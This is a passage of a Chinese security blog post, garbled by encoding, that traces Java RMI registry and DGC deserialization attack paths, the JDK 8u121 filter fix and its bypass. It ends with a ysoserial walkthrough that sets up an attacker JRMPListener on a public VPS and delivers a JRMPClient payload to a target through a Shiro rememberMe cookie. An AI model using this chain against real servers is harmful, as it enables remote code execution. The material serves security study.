ä¸ªå¦‚bind,unbindç­‰å‡å­˜åœ¨æ­¤é—®é¢˜</p><h3 id="æœåŠ¡ç«¯å¤„ç†remoteImpl-sayHello-quot-RMI-quot"><a href="#æœåŠ¡ç«¯å¤„ç†remoteImpl-sayHello-quot-RMI-quot" class="headerlink" title="æœåŠ¡ç«¯å¤„ç†remoteImpl.sayHello(&quot;RMI&quot;)"></a>æœåŠ¡ç«¯å¤„ç†<code>remoteImpl.sayHello(&quot;RMI&quot;)</code></h3><p>è·Ÿåˆ°UnicastServerRef.dispatchã€‚é€ä½ååºåˆ—åŒ–typesï¼Œå…¶å®å°±æ˜¯æˆ‘ä»¬<code>sayHello(&quot;RMI&quot;)</code>çš„å‚æ•°RMIã€‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919155849361.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919155849361.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>marshalValueåºåˆ—åŒ–å‡½æ•°è°ƒç”¨çš„ç»“æœå†ä¼ å›å®¢æˆ·ç«¯ã€‚ä¸ä¸Šé¢æˆ‘ä»¬åˆ†æå®¢æˆ·ç«¯<code>remoteImpl.sayHello(&quot;RMI&quot;)</code>ç›¸å¯¹åº”</p><p>å¦‚æœå®¢æˆ·ç«¯è°ƒç”¨å‡½æ•°çš„å‚æ•°æ˜¯æ¶æ„ååºåˆ—åŒ–ç±»ï¼Œä¼šå¯¹æœåŠ¡ç«¯é€ æˆååºåˆ—åŒ–æ”»å‡»</p><h2 id="DGCååºåˆ—åŒ–"><a href="#DGCååºåˆ—åŒ–" class="headerlink" title="DGCååºåˆ—åŒ–"></a>DGCååºåˆ—åŒ–</h2><p>åœ¨æœåŠ¡ç«¯<code>RemoteInterface remoteImpl = new RemoteImpl();</code>æ‰“ä¸Šæ–­ç‚¹ï¼Œè·Ÿè¿›åˆ°Transport.exportObjectï¼Œå‘ObjectTableå†™å…¥äº†target</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919165659042.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919165659042.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å…·ä½“çœ‹ä¸€ä¸‹å†™å…¥çš„putTargetå‡½æ•°ï¼Œåœ¨putä¹‹å‰æ‰§è¡Œäº†DGCImplçš„å‡½æ•°</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919170307941.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919170307941.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>DGCImpl.dgcLogæ˜¯ä¸€ä¸ªé™æ€å˜é‡</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919172030705.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919172030705.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è®¿é—®é™æ€å˜é‡ä¹‹å‰ï¼Œç±»å·²ç»æ‰§è¡Œäº†é™æ€ä»£ç å—è¿›è¡Œåˆå§‹åŒ–ï¼Œæ‰€ä»¥è°ƒè¯•å…ˆè¿›å…¥é™æ€ä»£ç å—</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919172135835.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919172135835.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>é™æ€ä»£ç å—é‡Œåˆ›å»ºäº†DGCImpl()å¯¹è±¡ï¼Œå¹¶ç±»ä¼¼åˆ›å»ºæ³¨å†Œä¸­å¿ƒstubä¸€æ ·ï¼Œä¸ä»…åˆ›å»ºäº†ä¸€ä¸ªä»£ç†DGCImpl_Stubï¼Œè¿˜è°ƒç”¨setSkeletonã€‚æœ€åå‘ObjectTableæ·»åŠ äº†è¿™ä¸ªDGCçš„Target</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919172707882.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919172707882.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>setSkeletonè·Ÿè¿›åˆ°creatSkeletonï¼Œç»å…¸çš„æ£€æµ‹æœ‰æ— DGCImpl_Skelï¼Œæœ‰çš„è¯åˆ›å»ºå¯¹è±¡å¹¶è¿”å›</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919173909264.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919173909264.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è¿™å°±æ˜¯ä¸ºä»€ä¹ˆæ‰§è¡Œå®ŒDGCImpl.dgclog.isLoggableå‡½æ•°åï¼ŒObjectTableå°±å¤šå‡ºäº†ä¸€ä¸ªDGCImpl_Stub</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919174410568.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919174410568.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å®é™…ä¸ŠDGCæ˜¯ç”¨æ¥åƒåœ¾å›æ”¶çš„ï¼Œåˆ†å‘DGCImpl_Stubå’ŒDGCImpl_Skelçš„æµç¨‹å’ŒRegistryImpl_Stubä¸RegistryImpl_Skelçš„æµç¨‹ç›¸åŒï¼Œè°ƒç”¨å…¶ä¸­å‡½æ•°ä¸dispatchçš„æµç¨‹ä¹Ÿç›¸åŒ</p><p>çœ‹ä¸€ä¸‹DGCImpl_Stubï¼Œcleanå‡½æ•°åŒæ ·å¯ä»¥è§¦å‘UnicastRef.invoke-&gt;excuteCall()ï¼Œå®¢æˆ·ç«¯ä¼šå—åˆ°æ”»å‡»</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919180449735.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919180449735.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>dirtyé™¤äº†å¯ä»¥è§¦å‘excuteCallï¼Œè¿˜æœ‰ååºåˆ—åŒ–RemoteCallæ—¶è¢«æ”»å‡»</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919180616231.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919180616231.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>DGCImpl_Skelä¹Ÿä¸€æ ·ï¼Œæ³¨å†Œä¸­å¿ƒå—åˆ°æ¥è‡ªå®¢æˆ·ç«¯çš„ååºåˆ—åŒ–æ”»å‡»</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919180945507.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919180945507.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>åªè¦åˆ›å»ºè¿œç¨‹å¯¹è±¡ï¼Œå°±ä¼šåˆ›å»ºDGCImplï¼Œå°±å¯èƒ½ä¼šé­åˆ°ä»¥ä¸Šæ”»å‡»ã€‚å› æ­¤æ›´é€šç”¨</p><h2 id="RMIæ”»å‡»æ–¹å¼"><a href="#RMIæ”»å‡»æ–¹å¼" class="headerlink" title="RMIæ”»å‡»æ–¹å¼"></a>RMIæ”»å‡»æ–¹å¼</h2><p>æ€»ç»“ä¸€ä¸‹å¯èƒ½é­åˆ°RMIæ”»å‡»çš„æ–¹å¼ï¼š</p><p>é€šè¿‡excuteCallæ”»å‡»çš„æ–¹å¼ï¼Œç§°ä¸ºJRMPã€‚</p><ul><li><p>å®¢æˆ·ç«¯</p><ul><li>è·å–è¿œç¨‹å¯¹è±¡ä»£ç†ï¼šRegistryImpl_Stub.lookup-&gt;excuteCall å½“caseä¸ºExceptionalReturnæ—¶è¿”å›æ¶æ„æµé€ æˆååºåˆ—åŒ–æ¼æ´ï¼ˆJRMPï¼‰</li></ul><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240912094823512.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240912094823512.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><ul><li>è°ƒç”¨å‡½æ•°ï¼šunmarshalValueååºåˆ—åŒ– è°ƒç”¨å‡½æ•°ï¼ˆsayHelloï¼‰è¿”å›å€¼</li></ul><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919092009418.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919092009418.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><ul><li><p>è°ƒç”¨DGCçš„cleanæˆ–è€…dirtyæ—¶ï¼Œä¼šè§¦å‘excuteCallï¼Œå—åˆ°JRMPæ”»å‡»ã€‚dirtyè¿˜å¤šä¸€ä¸ªååºåˆ—åŒ–è¿œç¨‹RemoteCallï¼Œä¹Ÿä¼šå—åˆ°æ”»å‡»</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919180449735.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919180449735.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p></li></ul></li><li><p>æ³¨å†Œç«¯</p><ul><li><code>RegistryImpl_Skel.dispatch</code>å¤„ç†lookupè¯·æ±‚ã€‚var2ååºåˆ—åŒ–ï¼Œå¦‚æœå®¢æˆ·ç«¯RegistryImpl_Stub.lookupä¼ è¾“æ¶æ„RemoteCallï¼Œåˆ™ä¼šå¯¹æ³¨å†Œç«¯é€ æˆååºåˆ—åŒ–æ”»å‡»</li></ul><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919150847207.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919150847207.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919150807876.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919150807876.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><ul><li><p>DGCImpl_Skelï¼Œæ³¨å†Œä¸­å¿ƒå—åˆ°æ¥è‡ªå®¢æˆ·ç«¯çš„ååºåˆ—åŒ–æ”»å‡»</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919180945507.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919180945507.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p></li></ul></li><li><p>æœåŠ¡ç«¯</p><ul><li>å¦‚æœå®¢æˆ·ç«¯è°ƒç”¨å‡½æ•°çš„å‚æ•°æ˜¯æ¶æ„ååºåˆ—åŒ–ç±»ï¼Œä¼šå¯¹æœåŠ¡ç«¯é€ æˆååºåˆ—åŒ–æ”»å‡»</li></ul><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919155849361.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919155849361.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p></li></ul><h2 id="ä¿®å¤"><a href="#ä¿®å¤" class="headerlink" title="ä¿®å¤"></a>ä¿®å¤</h2><p>8u121å¯¹ä»¥ä¸ŠRMIæ”»å‡»è¿›è¡Œäº†ä¿®å¤</p><p>åœ¨RegistryImplåŠ äº†ä¸€ä¸ªregistryFilterå‡½æ•°</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919200233889.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919200233889.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>åªæœ‰ä¸‹åˆ—çš„ç±»æ‰èƒ½ååºåˆ—åŒ–</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919200539232.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919200539232.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>DGCImplçš„è¿‡æ»¤æ›´åŠ ä¸¥é‡ï¼Œåªæœ‰ä»¥ä¸‹å››ç§ç±»æ‰èƒ½å…è®¸</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919200710159.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919200710159.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h2 id="RMIæ”»å‡»é«˜ç‰ˆæœ¬ç»•è¿‡"><a href="#RMIæ”»å‡»é«˜ç‰ˆæœ¬ç»•è¿‡" class="headerlink" title="RMIæ”»å‡»é«˜ç‰ˆæœ¬ç»•è¿‡"></a>RMIæ”»å‡»é«˜ç‰ˆæœ¬ç»•è¿‡</h2><p>8u121åªæ˜¯æ‹¦æˆªäº†ååºåˆ—åŒ–çš„ç±»ï¼Œè€Œå¹¶æ²¡æœ‰å»æ‰å„ä¸ªreadObjectçš„ç‚¹ï¼Œå¯¼è‡´ç»•è¿‡</p><p>registryFilterå…è®¸UnicastRefé€šè¿‡ã€‚UnicastRefå…è®¸JRMPæ”»å‡»ã€‚æ‰€ä»¥å®¢æˆ·ç«¯å¹¶æ²¡æœ‰è¢«ä¿®å¤ï¼ˆå¯ä»¥åšèœœç½ï¼‰ï¼Œä¾æ—§ä¼šå—åˆ°æ”»å‡»</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919203645701.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919203645701.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æ¥ä¸‹æ¥ä¸€ä¸ªæ€è·¯å¾ˆNBï¼Œæƒ³åŠæ³•åœ¨æœåŠ¡ç«¯è‡ªèº«å‘èµ·ä¸€ä¸ªå®¢æˆ·ç«¯è¯·æ±‚ï¼Œé‚£æœåŠ¡ç«¯åŒæ—¶ä¹Ÿæ˜¯å®¢æˆ·ç«¯ï¼Œå—åˆ°ååºåˆ—åŒ–æ”»å‡»ï¼ˆå› ä¸ºæœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯éƒ½å…±äº«ä»£ç ï¼‰ä¹Ÿå°±æ˜¯æƒ³åŠæ³•è°ƒç”¨UnicastRef.invoke</p><p>DGCImpl_Stubæ¯ä¸ªæ–¹æ³•éƒ½è°ƒç”¨äº†UnicastRef.invoke</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919225900797.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919225900797.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è€Œåˆ›å»ºStubéƒ½æ˜¯é€šè¿‡Util.createProxy</p><p>ç›´æ¥æŠ„ç»“è®ºï¼Œåœ¨DGCClient#EndpointEntry.EndpointEntry()å‡½æ•°åˆ›å»ºäº†dgc stub</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919214952065.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919214952065.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>DGCClient.lookupè°ƒç”¨äº†DGCClient#EndpointEntry.EndpointEntry()</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919215125716.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919215125716.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å‘ä¸ŠæŸ¥æ‰¾ç”¨æ³•ï¼Œè·Ÿåˆ°ConnectionInputStream.registerRefsï¼Œä¸è¿‡éœ€è¦if(incomingRefTableä¸ä¸ºç©º)</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919221050548.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919221050548.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å¦‚æœæ»¡è¶³ifï¼Œå‘ä¸Šæ‰¾åˆ°StreamRemoteCall.releaseInputStreamä¼šè°ƒç”¨ConnectionInputStream.registerRefs()</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919222701205.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919222701205.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>DGCImpl_Skel.dispatchå¤„ç†æ¯ä¸ªè¯·æ±‚ï¼ˆcleanã€dirtyï¼‰éƒ½ä¼šè°ƒç”¨releaseInputStream</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919223754247.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919223754247.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ä¹Ÿå°±æ˜¯è¯´if(incomingRefTableä¸ä¸ºç©º)ï¼Œæ­£å¸¸è°ƒç”¨DGCImplçš„cleanï¼Œdirtyå°±ä¼šåˆ›å»ºDGCImpl_Stub</p><p>ä¸‹é¢æ˜¯æ€ä¹ˆæ»¡è¶³if(incomingRefTableä¸ä¸ºç©º)</p><h3 id="RMIæµ"><a href="#RMIæµ" class="headerlink" title="RMIæµ"></a>RMIæµ</h3><p>LiveRef.readï¼Œå› ä¸ºRMIæµä¸€å®šæ˜¯ConnectionInputStreamä¼šèµ°åˆ°saveRefã€‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919221855377.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919221855377.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>savaRefä¼šå‘incomingRefTable putå€¼ï¼Œå°±èƒ½èµ°è¿›ifè§¦å‘ConnectionInputStream.registerRefs</p><p>UnicastRef.readExternalä¼šè§¦å‘readã€‚readExternalåœ¨ååºåˆ—åŒ–ä¸­ä¼šè‡ªåŠ¨è°ƒç”¨</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919224718012.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919224718012.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬ç”Ÿæˆä¸€ä¸ªUnicastRefå¯¹è±¡ï¼Œå¹¶å†™å…¥refï¼Œåœ¨ååºåˆ—åŒ–æ—¶å¯¹refè¿›è¡Œè¿˜åŸï¼Œè§¦å‘readï¼Œå°±èƒ½ç”ŸæˆDGCImpl_Stub</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919225356793.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919225356793.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>é‚£æ€ä¹ˆè°ƒç”¨cleanã€dirtyä¼ å…¥æ¶æ„å¯¹è±¡è¿›è¡Œååºåˆ—åŒ–æ”»å‡»å‘¢</p><p>åœ¨åˆ›å»ºå®Œdgcçš„ä¸‹é¢ï¼Œè°ƒç”¨RenewCleanThread</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919230536412.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919230536412.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è¿›ä¸€æ­¥è°ƒç”¨makeDirtyCall</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919230628877.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919230628877.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è§¦å‘äº†dirty</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919230704563.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919230704563.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è¿›è€ŒJRMP</p><h3 id="å…¶ä»–æµï¼Œå¦‚Shiroæµ"><a href="#å…¶ä»–æµï¼Œå¦‚Shiroæµ" class="headerlink" title="å…¶ä»–æµï¼Œå¦‚Shiroæµ"></a>å…¶ä»–æµï¼Œå¦‚Shiroæµ</h3><p>éRMIæµç›´æ¥è¿›elseåˆ›å»ºdgcäº†ï¼Œè·Ÿä¸Šé¢åˆ©ç”¨æ–¹å¼ä¸€æ ·</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919233346788.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919233346788.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h2 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h2><p>ysoserial</p><h3 id="8u121å‰"><a href="#8u121å‰" class="headerlink" title="8u121å‰"></a>8u121å‰</h3><p>ç”±äº<code>RegistryImpl_Skel.dispatch</code>å¤„ç†lookupã€bindç­‰è¯·æ±‚ï¼Œå®¢æˆ·ç«¯æ”»å‡»æ³¨å†Œä¸­å¿ƒ</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919231414609.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919231414609.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å®¢æˆ·ç«¯é€šè¿‡æ”»å‡»dgcæ”»å‡»æ³¨å†Œä¸­å¿ƒ</p><p>exploitä¸­</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919231641395.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919231641395.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>payloadä¸­ï¼ŒJRMPListeneræ˜¯é’ˆå¯¹ä¸€ä¸ªååºåˆ—åŒ–ç‚¹ï¼ŒRMIå¼€å¯å¦ä¸€ä¸ªRMIæœåŠ¡ï¼ˆç«¯å£ä¸åŒï¼‰ï¼Œå†æ‰“RMIï¼Œä¸€ç§äºŒæ¬¡ååºåˆ—åŒ–ã€‚ç»•è¿‡ä¸€äº›RMIé™åˆ¶ï¼Œä½†æ˜¯åŸæ¥çš„é“¾å­æ—¢ç„¶éƒ½èƒ½æ‰§è¡Œå¼€RMIäº†ï¼Œä¹Ÿèƒ½RCEäº†ğŸ˜‚ï¼Œæ²¡ä»€ä¹ˆç”¨</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919232620197.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919232620197.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="8u121å"><a href="#8u121å" class="headerlink" title="8u121å"></a>8u121å</h3><p>ä¸Šæ–‡çš„é«˜ç‰ˆæœ¬ç»•è¿‡ï¼ŒRMIæµï¼Œå¯æ”»å‡»æ³¨å†Œä¸­å¿ƒå’Œå®¢æˆ·ç«¯</p><p>exploitä¸­</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919232311093.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919232311093.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ä¹Ÿæ˜¯ä¸Šæ–‡çš„é«˜ç‰ˆæœ¬ç»•è¿‡ï¼Œä½†æ˜¯èµ°çš„éRMIæµï¼Œåˆ©ç”¨éRMIæµèµ°å¼€RMIæœåŠ¡ï¼Œç”¨è¿™ä¸ªpayload&#x2F;JRMPClientå¼€RMIæœåŠ¡ï¼Œå†ç”¨exploitå¯¹RMIè¿›è¡Œæ”»å‡»ã€‚éå¸¸å¸¸ç”¨çš„äºŒæ¬¡ååºåˆ—åŒ–é“¾å­ã€‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919232905118.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919232905118.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è¿™ä¸ªpayloadå¯ä»¥åœ¨æœ¬æœºå¼€JRMPç›‘å¬</p><p>Usageï¼š</p><p>æ”»å‡»è€…å…ˆåœ¨å…¬ç½‘ vps ï¼ˆæœ¬æœºå¯ä»¥ç”¨èŠ±ç”Ÿå£³æ˜ å°„ï¼‰ä¸Šç”¨ ysoserial å¯ä¸€ä¸ªæ¶æ„çš„ JRMPListenerï¼Œç›‘å¬åœ¨ 19999 ç«¯å£ï¼Œå¹¶æŒ‡å®šä½¿ç”¨ CommonsCollections6 æ¨¡å—ï¼Œè¦è®©ç›®æ ‡æ‰§è¡Œçš„å‘½ä»¤ä¸º ping ä¸€ä¸ªåŸŸåï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.expeseloit.JRMPListener 19999 CommonsCollections6 &quot;ping cc6.m2pxdwq5pbhubx9p6043sg8wqnwdk2.burpcollaborator.net&quot;</span><br></pre></td></tr></table></figure><p>ç„¶åç”¨ ysoserial ç”Ÿæˆ JRMPClient çš„åºåˆ—åŒ– payloadï¼ŒæŒ‡å‘ä¸Šä¸€æ­¥ç›‘å¬çš„åœ°å€å’Œç«¯å£ï¼ˆå‡å¦‚æ”»å‡»è€…æœåŠ¡å™¨ ip åœ°å€ä¸º 1.1.1.1ï¼‰ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar JRMPClient &quot;1.1.1.1:19999&quot; &gt; /tmp/jrmp.ser</span><br></pre></td></tr></table></figure><p>å†ç”¨ shiro ç¼–ç è„šæœ¬å¯¹ JRMPClient payload è¿›è¡Œç¼–ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar shiro-exp.jar encrypt /tmp/jrmp.ser</span><br></pre></td></tr></table></figure><p>å°†æœ€åå¾—åˆ°çš„å­—ç¬¦ä¸² Cookie ä½œä¸º rememberMe Cookie çš„å€¼ï¼Œå‘é€åˆ°ç›®æ ‡ç½‘ç«™ã€‚å¦‚æœåˆ©ç”¨æˆåŠŸï¼Œåˆ™å‰é¢æŒ‡å®šçš„ ping å‘½ä»¤ä¼šåœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šæ‰§è¡Œï¼ŒBurp Collaborator client ä¹Ÿå°†æ”¶åˆ° DNS è§£æè®°å½•ã€‚</p><h2 id="ä¿®å¤-1"><a href="#ä¿®å¤-1" class="headerlink" title="ä¿®å¤"></a>ä¿®å¤</h2><p>åœ¨jdk 8u231ä¸­ï¼ŒRMIé’ˆå¯¹accessCheckè¿›è¡Œäº†ä¿®å¤ã€‚ä½†è¿˜æ˜¯å¯ä»¥ç»•</p><p><a 